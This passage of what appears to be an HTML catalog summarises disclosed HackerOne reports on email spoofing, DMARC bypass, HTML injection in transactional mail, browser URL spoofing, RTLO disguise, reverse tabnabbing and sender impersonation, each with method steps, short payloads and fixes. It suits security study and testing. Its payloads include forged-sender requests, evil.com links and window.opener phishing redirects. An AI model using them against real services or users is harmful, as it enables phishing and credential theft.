+<div class="spec-top"><h3>Email relay/forwarder rewrites From, invalidating DKIM/ARC to bypass DMARC</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#2109320</b> · mozilla · 1000 · 42 votes · resolved</div>
+<div class="taxo"><span>Program <b>mozilla</b></span><span>Surface <b>other</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A forwarding service (Firefox Relay) recomposes the whole email with its own template and rewrites the From header to @relay.firefox.com. This strips/invalidates the original DKIM/ARC signatures, and the relay's high-reputation IP/domain lets a spoofed message that would normally be blocked (even DMARC=reject) land in the inbox.</p>
+<h4>Method</h4><ol><li>Pick a spoof target domain (test none/quarantine/reject DMARC policies)</li><li>Craft an email with a forged From header for that domain</li><li>Send it to a victim's Relay alias address</li><li>Relay recomposes/forwards it from @relay.firefox.com; DKIM/ARC no longer bind original From, so it reaches inbox without spoofing warnings</li></ol>
+<div class="pre"># Send spoofed 'From: security@nicehash.com' (DMARC=reject) to victim's Relay alias
+# Relay re-sends from @relay.firefox.com -&gt; delivered to inbox, no DMARC drop</div>
+<p class="insight"><b>Insight —</b> Any mail forwarder/relay/notification pipe that rewrites the From header and re-signs with its own trusted domain becomes a DMARC-laundering channel. Test forwarding services by feeding them spoofed-From mail and checking if it reaches the inbox re-signed. Fixes: validate inbound DMARC before forwarding, ARC-seal, and don't rewrite From.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2109320" target="_blank" rel="noopener">hackerone.com/reports/2109320</a></span><a class="src" href="#report-2109320" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-1083923" style="--sv:var(--sev-med)" data-sev="2" data-votes="38" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Arbitrary sender in 'share/send-to-friend' feature</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1083923</b> · openmage · none · 38 votes · resolved</div>
+<div class="taxo"><span>Program <b>openmage</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The send-to-friend/share-product email feature lets the user set the From/sender address to an arbitrary value, so mail originates from a domain the attacker doesn't own, enabling convincing phishing from the trusted store's mail infrastructure.</p>
+<h4>Method</h4><ol><li>Open the share-product endpoint (/sendfriend/product/send/id/&lt;id&gt;)</li><li>Set the Sender email to an arbitrary address (not yours)</li><li>Enter the victim recipient and send</li><li>Victim receives attacker-controlled content from a spoofed sender via the trusted store</li></ol>
+<div class="pre">POST /sendfriend/product/send/id/430  sender_email=ceo@victimbrand.com&amp;recipient=victim@target.com</div>
+<p class="insight"><b>Insight —</b> Any 'email this to a friend / share / invite / refer' feature is a phishing vector if the From, display name, or message body is user-controlled and sent from the app's trusted SMTP. Test sender spoofing and body/link injection. Fix pattern: force From to a fixed app address.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1083923" target="_blank" rel="noopener">hackerone.com/reports/1083923</a></span><a class="src" href="#report-1083923" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-3413764" style="--sv:var(--sev-med)" data-sev="2" data-votes="26" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Account impersonation via missing username normalization (whitespace)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#3413764</b> · revive_adserver · none · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>revive_adserver</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Usernames are stored without normalization/trim, so leading/trailing whitespace ('admin' vs ' admin') is accepted and rendered visually identical in the UI, enabling impersonation and audit-log confusion.</p>
+<h4>Method</h4><ol><li>As a user-admin, add a user with a username padded with leading/trailing spaces (e.g. ' admin')</li><li>Save; in the user list the account is visually indistinguishable from the real admin</li><li>Use it for social engineering / to muddy log attribution</li></ol>
+<div class="pre">username: " admin"   (leading/trailing space; also try unicode homoglyphs and case variants)</div>
+<p class="insight"><b>Insight —</b> Test account systems for missing username normalization: leading/trailing whitespace, unicode homoglyphs, zero-width chars, and case folding. Missing normalization enables visually-identical impersonation and log confusion even without direct privilege gain.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3413764" target="_blank" rel="noopener">hackerone.com/reports/3413764</a></span><a class="src" href="#report-3413764" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-1600720" style="--sv:var(--sev-med)" data-sev="2" data-votes="25" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTML injection in transactional email via profile field</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1600720</b> · acronis · none · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>acronis</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The First Name field from registration is reflected unsanitized into the HTML body of the welcome email, allowing injected tags (links, images) rendered in the recipient's inbox.</p>
+<h4>Method</h4><ol><li>Register with the victim's email</li><li>Set First Name to an HTML payload with an attacker link</li><li>Victim receives the trial email containing the injected link/image</li></ol>
+<div class="pre">First Name: "/&gt;&lt;img src="x"&gt;&lt;a href="https://evil.com"&gt;login&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> User-controlled profile/registration fields that appear in outbound emails are HTML-injection sinks. Because the email is sent from the vendor's own domain, injected phishing links look legitimate. Test name/company/address fields for reflection into transactional mail.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1600720" target="_blank" rel="noopener">hackerone.com/reports/1600720</a></span><a class="src" href="#report-1600720" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-374969" style="--sv:var(--sev-med)" data-sev="2" data-votes="25" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Protocol-handler prompt attributed to a trusted origin via window.open</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#374969</b> · brave · awarded · 25 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>desktop</b></span><span>Chain <b>combined with report #369185/#369218 to strengthen a phishin</b></span></div>
+<h4>Root cause</h4><p style="margin:0">When a page opens a child window (window.open) to a trusted site and then changes that window's location to a custom-protocol URL, the browser attributes the external-app-launch prompt to the previously loaded trusted origin rather than the attacker.</p>
+<h4>Method</h4><ol><li>From attacker page, window.open('https://google.com')</li><li>After a delay, set the opened window's location to a protocol handler (ssh://evil.com)</li><li>The 'open external application?' prompt appears as coming from google.com</li></ol>
+<div class="pre">w = window.open('https://google.com');
+setTimeout(()=&gt;{ w.location.replace('ssh://evil.com'); }, 1000);</div>
+<p class="insight"><b>Insight —</b> Origin attribution for protocol-handler / external-app prompts can be spoofed via window.open followed by a delayed cross-navigation. Useful as a trust-boosting step in phishing/clickjacking chains.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/374969" target="_blank" rel="noopener">hackerone.com/reports/374969</a></span><a class="src" href="#report-374969" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-196222" style="--sv:var(--sev-med)" data-sev="2" data-votes="18" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>RTLO (U+202E) unicode to disguise malicious file/link extension</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#196222</b> · snapchat · awarded · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>snapchat</b></span><span>Surface <b>mobile-android</b></span><span>Chain <b>RTLO display spoof → victim clicks/downloads a .exe believin</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Chat/message rendering does not strip bidirectional-control unicode (U+202E Right-To-Left Override), so an attacker reverses the visual order of a filename/link tail, making a .exe display as .mp3 (or any benign extension) to the victim.</p>
+<h4>Method</h4><ol><li>Insert a U+202E character before a crafted suffix in the displayed link/filename</li><li>Place the real dangerous extension so that, when reversed, it visually reads as a benign one</li><li>Send in chat; victim sees e.g. 'song.mp3' but the real target ends in .exe</li></ol>
+<div class="pre">example.com/song[U+202E]3pm.exe   -&gt;  renders as  example.com/songexe.mp3</div>
+<p class="insight"><b>Insight —</b> Any text surface that renders raw unicode is a spoofing sink — test bidi overrides (U+202E/U+202B) and homoglyphs to disguise link paths, filenames, sender names, and OAuth app names. Strip or escape bidi-control characters on display.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/196222" target="_blank" rel="noopener">hackerone.com/reports/196222</a></span><a class="src" href="#report-196222" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-360171" style="--sv:var(--sev-med)" data-sev="2" data-votes="15" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Phishing email from trusted noreply@ via user-controlled signup fields</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#360171</b> · gsa_bbp · awarded · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>gsa_bbp</b></span><span>Surface <b>api</b></span><span>Chain <b>unbounded re-signup + templated user fields -&gt; targeted p</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The api.data.gov signup welcome email embeds attacker-controlled fields (first_name, example_api_url, contact_url) verbatim, and the same email can be re-triggered unlimited times, letting an attacker send arbitrary messages/links from noreply@api.data.gov.</p>
+<h4>Method</h4><ol><li>Submit the signup form and intercept the POST to /api-umbrella/v1/users.json</li><li>Set user[first_name] to an attacker sentence and options[example_api_url]/contact_url to attacker URLs</li><li>Set user[email] to the victim; send</li><li>Victim receives a legitimately-signed email from noreply@api.data.gov containing attacker content</li></ol>
+<div class="pre">POST /api-umbrella/v1/users.json?api_key=...
+user[first_name]=This is from the government, visit the following URL to register.&amp;user[email]=victim@example.com&amp;options[example_api_url]=https://attacker.tld&amp;options[contact_url]=https://attacker.tld&amp;options[send_welcome_email]=true</div>
+<p class="insight"><b>Insight —</b> Transactional email templates that interpolate user-supplied name/URL fields are a phishing primitive: you get deliverability and trust of the victim's own domain. Also test that the same address can be signed up repeatedly (no dedupe = mail-bomb/phish amplifier).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/360171" target="_blank" rel="noopener">hackerone.com/reports/360171</a></span><a class="src" href="#report-360171" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-369086" style="--sv:var(--sev-med)" data-sev="2" data-votes="14" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Browser address-bar URL spoofing via window.open + document.write</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#369086</b> · brave · awarded · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>desktop</b></span><span>Chain <b>URL spoof -&gt; credential phishing under trusted origin app</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Opening a URL whose response is slow/empty (e.g. google.com/csi) leaves the address bar showing that URL while the document is effectively about:blank; the opener then document.write()s arbitrary content, so attacker HTML/JS runs under a spoofed, trusted-looking URL (address bar even stays put during alert()).</p>
+<h4>Method</h4><ol><li>From attacker page, on user gesture call window.open(target_trusted_url)</li><li>After a short timeout, write attacker content into the new window's document</li><li>Address bar keeps showing the trusted URL while attacker content/JS executes</li></ol>
+<div class="pre">&lt;script&gt;
+window.onclick = function(){
+  x = window.open('https://www.google.com/csi');
+  setTimeout(function(){
+    x.document.write(`spoofed content &lt;button onclick="alert('JS runs here')"&gt;click&lt;/button&gt;`);
+  },100);
+};
+&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> URL-spoofing bugs hinge on a race between navigation commit and document replacement. Test window.open to endpoints that return slowly/blank, then document.write; if the address bar retains the target URL, you have credible phishing. Report with a concrete gesture-triggered PoC.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/369086" target="_blank" rel="noopener">hackerone.com/reports/369086</a></span><a class="src" href="#report-369086" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-457829" style="--sv:var(--sev-med)" data-sev="2" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SPF softfail (~all) enables sender spoofing</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#457829</b> · mycrypto · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>mycrypto</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">SPF record ends in ~all (softfail) instead of -all (hardfail), so mail from unauthorized senders is accepted/quarantined rather than rejected, allowing spoofed mail from the domain.</p>
+<h4>Method</h4><ol><li>dig TXT domain to read the SPF record</li><li>If it ends in ~all (or ?all / no SPF), send mail with From: support@domain via any relay</li><li>Message passes/lands, appearing to originate from the trusted domain</li></ol>
+<div class="pre">v=spf1 include:_spf.google.com ~all   # weak -&gt; should be -all
+
+&lt;?php
+mail('victim@example.com','Password Change','Reset here: http://EVIL','From: support@TARGET');</div>
+<p class="insight"><b>Insight —</b> Always check SPF (~all vs -all), plus DMARC policy (p=none is effectively spoofable) and DKIM. Softfail + p=none is a reliable phishing primitive; escalate impact by showing a delivered spoofed mail, not just the record.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/457829" target="_blank" rel="noopener">hackerone.com/reports/457829</a></span><a class="src" href="#report-457829" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-373721" style="--sv:var(--sev-med)" data-sev="2" data-votes="9" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Address-bar URL spoof via bogus protocol handler navigation</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#373721</b> · brave · awarded · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>desktop</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Navigating window.open to an unknown/bogus protocol handler (http.://google.com) leaves the spoofed URL in the address bar instead of resetting to about:blank, while the opened document remains writable by the opener, so an attacker renders arbitrary content under a trusted URL.</p>
+<h4>Method</h4><ol><li>From attacker page, window.open('http.://TRUSTED.com') (note the extra dot -&gt; unknown scheme)</li><li>Browser keeps 'http.://TRUSTED.com' visible in the address bar rather than clearing it</li><li>Use the returned window handle to document.write attacker content -&gt; page looks like it is TRUSTED.com</li></ol>
+<div class="pre">x = window.open('http.://google.com')
+setTimeout(() =&gt; {
+  x.document.write(`Hello Google.com! &lt;button onclick="alert('JS on this page')"&gt;Click&lt;/button&gt;`)
+}, 1000)</div>
+<p class="insight"><b>Insight —</b> To test browser/embedded-webview URL spoofing, open unusual/unknown scheme URLs (scheme with trailing dot, unregistered protocol handlers) and check whether the address bar is reset to about:blank and whether the opener can still write into the document.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/373721" target="_blank" rel="noopener">hackerone.com/reports/373721</a></span><a class="src" href="#report-373721" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-117097" style="--sv:var(--sev-med)" data-sev="2" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Email spoofing via unclaimed SPF include (shared ESP)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#117097</b> · gratipay · USD 10 · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>gratipay</b></span><span>Surface <b>web</b></span><span>Chain <b>dangling SPF include -&gt; spoofed phishing mail from the re</b></span><span>Tag <b>subdomain-takeover</b></span><span>Tag <b>spoofing-phishing</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The domain's SPF record includes a shared email provider (spf.mandrillapp.com) that the org no longer uses/never claimed; because Mandrill authorises mail for any domain whose SPF points at it, an attacker with their own Mandrill account can send SPF-passing mail as the domain.</p>
+<h4>Method</h4><ol><li>Read the target SPF record and note include: entries for shared ESPs (Mandrill, SendGrid, Freshdesk, etc.)</li><li>Confirm the domain is not actually configured/claimed on that ESP</li><li>Register your own account on that ESP</li><li>Send mail from the ESP with the target domain as From - it passes SPF</li></ol>
+<div class="pre">v=spf1 include:email.freshdesk.com include:spf.mandrillapp.com include:_spf.google.com -all
+# attacker sends from @TARGET via their own Mandrill tenant -&gt; SPF pass</div>
+<p class="insight"><b>Insight —</b> Audit SPF include: entries for shared ESPs the org has abandoned or never verified - these are 'dangling includes' enabling authenticated-looking spoofing. Same class as subdomain takeover but for email trust. Remove unused includes or complete domain verification/DKIM.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/117097" target="_blank" rel="noopener">hackerone.com/reports/117097</a></span><a class="src" href="#report-117097" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-109161" style="--sv:var(--sev-med)" data-sev="2" data-votes="8" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reverse tabnabbing via user link without rel=noopener</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#109161</b> · gratipay · awarded · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>gratipay</b></span><span>Surface <b>web</b></span><span>Chain <b>stored link -&gt; reverse tabnabbing -&gt; credential phishi</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled profile links are rendered as outbound anchors that open a new context while leaving window.opener accessible (no rel=noopener); the linked page can rewrite the original tab to a phishing clone.</p>
+<h4>Method</h4><ol><li>Put an attacker link in a user-controlled profile field (statement)</li><li>Victim clicks it; the new tab retains window.opener to the original</li><li>From the attacker page set window.opener.location to a phishing copy of the site</li><li>Victim returns to the original tab and re-enters credentials on the fake page</li></ol>
+<div class="pre">&lt;a href="http://attacker.example"&gt;link&lt;/a&gt;
+// attacker page: if (window.opener) window.opener.location = 'https://phish.example/login';
+// fix: rel="noopener noreferrer"</div>
+<p class="insight"><b>Insight —</b> Any place users can inject links (profiles, comments, markdown) that render with target=_blank needs rel="noopener noreferrer". Test by hosting a page that does window.opener.location and clicking through. Note: rel=nofollow (the reporter's suggested fix) does NOT mitigate this - noopener does.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/109161" target="_blank" rel="noopener">hackerone.com/reports/109161</a></span><a class="src" href="#report-109161" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-56742" style="--sv:var(--sev-med)" data-sev="2" data-votes="6" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Email spoofing via shared-ESP SPF include</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#56742</b> · security · awarded · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The domain's SPF record includes a shared email provider (spf.mandrillapp.com) whose sending IPs are shared across all customers; because the sender's own subaccount wasn't locked down, any Mandrill customer could send SPF-passing mail as the domain.</p>
+<h4>Method</h4><ol><li>dig the target's SPF TXT record and list include: entries</li><li>Identify shared ESPs (mandrill/sendgrid/etc.)</li><li>Sign up for that ESP and send mail with From: anything@target.com</li><li>Mail passes SPF because it originates from the shared provider's authorized IPs</li></ol>
+<div class="pre">dig txt hackerone.com
+; v=spf1 include:_spf.google.com include:sendgrid.net include:spf.mandrillapp.com ~all</div>
+<p class="insight"><b>Insight —</b> An SPF include of a shared/multi-tenant ESP is a spoofing vector unless the domain also completes that ESP's domain-lock/verification. Enumerate include: entries and test each shared provider.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/56742" target="_blank" rel="noopener">hackerone.com/reports/56742</a></span><a class="src" href="#report-56742" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-124889" style="--sv:var(--sev-med)" data-sev="2" data-votes="6" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reverse tabnabbing via target=_blank window.opener</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#124889</b> · security · awarded · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-supplied links open with target=_blank but no rel=noopener, so the destination page retains a reference to window.opener and can navigate the original tab (opener.location) to a look-alike phishing page while the user is on the new tab.</p>
+<h4>Method</h4><ol><li>Post a link (in a report/comment/profile) pointing to attacker page</li><li>Attacker page runs opener.location='https://phish/'</li><li>Victim clicks the link; the still-open trusted tab is silently rewritten to a credential-harvesting clone</li></ol>
+<div class="pre">&lt;!-- attacker landing page --&gt;
+&lt;script&gt;if(window.opener)window.opener.location='https://phish.example/login';&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Anywhere the app renders user-controlled links that open in a new tab, check for missing rel="noopener"/noreferrer. The opener reference lets the child tab redirect the parent - devastating for trusted contexts (dashboards, report pages) because the URL bar of the ORIGINAL tab changes to something the victim already trusted.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/124889" target="_blank" rel="noopener">hackerone.com/reports/124889</a></span><a class="src" href="#report-124889" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-213114" style="--sv:var(--sev-med)" data-sev="2" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reverse tabnabbing via markup that emits target=_blank without rel=noopener</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#213114</b> · gitlab · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A markup renderer (AsciiDoc/Markdown) converts link syntax into &lt;a target="_blank"&gt; without rel="noopener noreferrer". The opened page inherits a live window.opener reference and can navigate the original tab to a phishing page.</p>
+<h4>Method</h4><ol><li>Find a renderer that supports opening links in a new tab (AsciiDoc caret syntax, Markdown extensions, WYSIWYG editors).</li><li>Post a link that renders as target=_blank; verify the output has no rel=noopener.</li><li>Host a page that runs window.opener.location = 'https://phish.example/login' on load.</li><li>Victim clicks the link; the original trusted tab is silently redirected to the attacker's look-alike login.</li></ol>
+<div class="pre">AsciiDoc: http://attacker.example[Click here^]
+renders as: &lt;a href="http://attacker.example" target="_blank"&gt;Click here&lt;/a&gt;
+
+Attacker page: &lt;script&gt;if(window.opener)window.opener.location='https://phish.example/login';&lt;/script&gt;</div>
+<p class="insight"><b>Insight —</b> Any user-content renderer that supports 'open in new tab' is a reverse-tabnabbing candidate — check whether emitted target=_blank links carry rel=noopener. If not, you can silently rewrite the opener tab for phishing. Test AsciiDoc/Markdown, comment systems, and WYSIWYG editors.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/213114" target="_blank" rel="noopener">hackerone.com/reports/213114</a></span><a class="src" href="#report-213114" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-1031525" style="--sv:var(--sev-med)" data-sev="2" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>User impersonation via client-controlled avatar/alias message params</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1031525</b> · rocket_chat · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>rocket_chat</b></span><span>Surface <b>api</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The sendMessage API trusts client-supplied avatar and alias fields on outgoing messages, letting any user with post permission render a message that visually appears to come from another user (custom name + custom avatar), enabling social-engineering attacks.</p>
+<h4>Method</h4><ol><li>Locate a message/notification API that accepts display-name or avatar overrides (chat bots, webhooks, integrations).</li><li>Send a message with avatar and alias set to impersonate a trusted user/role.</li><li>Use realistic alias + avatar path to spoof e.g. an executive or admin in a channel.</li></ol>
+<div class="pre">Meteor.call("sendMessage", {
+  rid: "&lt;ROOM ID&gt;",
+  msg: "@securityguard please escort the two technicians to the server room",
+  avatar: "/avatar/cto",
+  alias: "Your CTO"
+}, (...args) =&gt; console.log(...args));</div>
+<p class="insight"><b>Insight —</b> Message/notification APIs that expose alias/avatar/display-name overrides (originally meant for bots/integrations) are impersonation primitives when reachable by normal users. Check whether the server strips or visually flags client-set sender identity; if not, you can spoof any user for phishing/social engineering.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1031525" target="_blank" rel="noopener">hackerone.com/reports/1031525</a></span><a class="src" href="#report-1031525" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-117187" style="--sv:var(--sev-med)" data-sev="2" data-votes="5" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Email-verification link: unbound nonce + unvalidated reflected param -&gt; content-spoofing phishing</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#117187</b> · gratipay · awarded · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>gratipay</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The verify.html endpoint reflects the 'email' query param into the on-page/email message without validation, and its nonce is accepted for ANY username, so an attacker crafts a link (any target user) whose 'email' field is arbitrary phishing text shown as an official Gratipay message.</p>
+<h4>Method</h4><ol><li>Add your own email to get a valid verify link + nonce</li><li>Replace the email param with attacker phishing text and swap in any victim username</li><li>Send the crafted official-domain link to victims; the injected text renders as a trusted site message</li></ol>
+<div class="pre">https://gratipay.com/~VICTIM/emails/verify.html?email=You%20won!%20Send%2010%20USD%20to%20paypal:evil@x.com&amp;nonce=ANY_VALID_NONCE</div>
+<p class="insight"><b>Insight —</b> Verification/confirmation endpoints that (a) reflect an attacker-controlled param into the message and (b) use a nonce not bound to the specific user/email are content-spoofing/phishing gold - the payload rides on the trusted domain. Test whether the nonce is scoped to the exact user+email or globally reusable. Related email-verify logic flaw at the same endpoint: resend-verification silently associating an arbitrary look-alike email (#156542).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/117187" target="_blank" rel="noopener">hackerone.com/reports/117187</a></span><a class="src" href="#report-117187" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-117159" style="--sv:var(--sev-med)" data-sev="2" data-votes="4" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Missing SPF/DMARC enables email spoofing</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#117159</b> · gratipay · awarded · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>gratipay</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Domains (aspen.io, grtp.co) had no valid SPF (and no DMARC) records, allowing an attacker to send spoofed email as those domains.</p>
+<h4>Method</h4><ol><li>Query TXT/SPF and DMARC records for the target domain</li><li>Confirm no valid SPF/DMARC policy exists</li><li>Send/relay spoofed mail claiming the domain as sender for phishing</li></ol>
+<div class="pre">dig TXT target.tld  # no v=spf1 record
+dig TXT _dmarc.target.tld  # no DMARC policy</div>
+<p class="insight"><b>Insight —</b> Always check SPF/DKIM/DMARC on in-scope mail domains; absent/permissive policies enable spoofed phishing from the brand's own domain.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/117159" target="_blank" rel="noopener">hackerone.com/reports/117159</a></span><a class="src" href="#report-117159" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-139402" style="--sv:var(--sev-med)" data-sev="2" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Unauthenticated email-send endpoint + HTML injection -&gt; phishing</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#139402</b> · informatica · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>informatica</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A share/preview endpoint (EmailExtended.aspx) sends email with attacker-controlled sender, recipient, subject and body when the docid is invalid, and the body permits &lt;a&gt;/&lt;img&gt; HTML injection, enabling spoofed credential-phishing from a trusted domain.</p>
+<h4>Method</h4><ol><li>POST to the email endpoint with an invalid docid to unlock all sender/recipient/body fields</li><li>Set From to a trusted address and inject an &lt;a&gt; phishing link in the body</li><li>Email is delivered from the target's own infrastructure</li></ol>
+<div class="pre">POST /_layouts/infa_kb/preview/EmailExtended.aspx?docid=test
+...&amp;TextBox4=admin@informatica.com&amp;TextBox5=A convincing subject&amp;TextBox6=Please visit &lt;a href=http://evil.example&gt;Our login page&lt;/a&gt; and enter your credentials&amp;Button1=Submit</div>
+<p class="insight"><b>Insight —</b> Preview/share/'email this' features that let you set sender + body are open relays for branded phishing. Try an invalid resource id to unlock hidden fields, and test the body for HTML injection to embed links/images. Delivery from the real domain massively raises phish credibility.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/139402" target="_blank" rel="noopener">hackerone.com/reports/139402</a></span><a class="src" href="#report-139402" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-84287" style="--sv:var(--sev-med)" data-sev="2" data-votes="2" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Email spoofing via missing DKIM / weak SPF</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#84287</b> · gratipay · awarded · 2 votes · resolved</div>
+<div class="taxo"><span>Program <b>gratipay</b></span><span>Surface <b>web</b></span></div>
